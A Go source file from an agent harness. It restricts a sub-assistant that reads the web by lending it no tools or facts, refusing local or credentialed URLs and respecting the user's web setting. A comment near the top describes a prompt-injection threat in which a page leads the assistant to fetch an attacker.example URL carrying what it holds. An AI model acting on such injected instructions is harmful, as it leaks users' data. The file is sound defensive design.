package main

import (
	"context"
	"errors"
	"fmt"
	"log"
	"slices"
)

// An assistant's web (#244 step 8, the tech watch): the power readsWeb
// gives it its harness's search and page reader. It reads for the user so
// that the brain does not have to (whyBoundary), so its session is tainted
// as soon as it reads, like any assistant's.
//
// A URL is a way out: a page could talk it into reading
// https://attacker.example/?q=<what it holds>. So an assistant that reads
// the web holds nothing to send: it is lent no catalog tool and no fact
// (checkAssistant), and what it writes is its own state, read by the
// brain as any assistant's. Each read is decided here, as the brain's are
// (brain_web.go): a local or credentialed URL is refused, the web's value
// in Settings → Tools holds (Never refuses; On approval refuses too, since
// an assistant never waits on a card); anything else of its harness is
// refused.

const powerReadsWeb = "readsWeb"

func init() {
	assistantPowers = append(assistantPowers, powerReadsWeb)
}

// checkWebPower: an assistant that reads the web is lent nothing to send.
func checkWebPower(a Assistant) error {
	if a.Role != assistantRoleAssistant || !a.can(powerReadsWeb) {
		return nil
	}
	if len(a.Tools) > 0 || len(a.Facts) > 0 {
		return errors.New("an assistant that reads the web is lent no tool and no fact: what it reads could send away what it holds")
	}
	return nil
}

// assistantHarnessTools are the harness tools an assistant keeps: its
// role's, and the web's when it reads it.
func assistantHarnessTools(a Assistant, r assistantRole) []string {
	out := slices.Clone(r.HarnessTools)
	if a.can(powerReadsWeb) {
		out = append(out, webSearchTool, webFetchTool)
	}
	return out
}

// assistantPermission is the assistant role's approval path: its web
// reads, when it has the power, and nothing else.
func (c *core) assistantPermission(ctx context.Context, a Assistant, t *TaskRow) error {
	st, err := c.status(t.ID, 0)
	if err != nil {
		return err
	}
	for _, p := range st.PendingPermissions {
		pid, tool := fmt.Sprint(p["id"]), fmt.Sprint(p["tool_name"])
		if c.store.answered(t.ID, pid) {
			continue
		}
		input, _ := p["input"].(map[string]any)
		yes, why := c.assistantWebDecision(a, tool, input)
		log.Printf("%s: %s %s: %v (%s)", c.assistantLog(a), tool, truncate(webURL(input)+webSearchQuery(input), 200), yes, why)
		if _, err := c.answer(ctx, t.ID, pid, map[bool]string{true: "", false: why}[yes], &yes, byPolicy); err != nil {
			return err
		}
	}
	return nil
}

func (c *core) assistantWebDecision(a Assistant, tool string, input map[string]any) (bool, string) {
	if tool != webFetchTool && tool != webSearchTool || !a.can(powerReadsWeb) {
		return false, "Un assistant n'utilise que ses outils MCP."
	}
	if tool == webFetchTool {
		if why := localURL(webURL(input)); why != "" {
			return false, "Refusé par la politique d'Eriphe : " + why + "."
		}
	}
	switch c.webValue() {
	case gridNever:
		return false, "Refusé : le web est coupé dans Réglages → Outils."
	case gridApproval:
		return false, "Refusé : le web demande l'accord de l'utilisateur (Réglages → Outils), et un assistant n'attend pas de carte."
	}
	return true, "allowed"
}
